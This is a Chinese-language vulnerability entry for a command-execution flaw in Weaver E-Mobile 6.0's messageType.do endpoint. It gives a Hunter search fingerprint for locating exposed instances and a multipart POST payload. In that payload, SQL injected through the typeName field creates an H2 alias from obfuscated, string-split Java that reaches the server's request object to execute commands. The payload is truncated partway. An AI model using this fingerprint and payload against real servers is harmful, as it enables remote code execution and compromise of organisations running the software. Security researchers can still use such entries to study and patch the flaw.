# 泛微E-Mobile6.0messageType.do存在命令执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：`app.name=="泛微 e-mobile OA"``
- **请求**：`POST /messageType.do HTTP/1.1`

**请求体 / payload**
```
数据包：
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 127.0.0.1
Content-Length: 1090
--00content0boundary00
Content-Disposition: form-data; name="method"
create
--00content0boundary00
Content-Disposition: form-data; name="typeName"
1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = cur…（脚本共 1185 字，完整版见原文）
```

**其他**
- 泛微E-Mobile 6.0 messageType.do存在命令执行漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-Mobile 6.0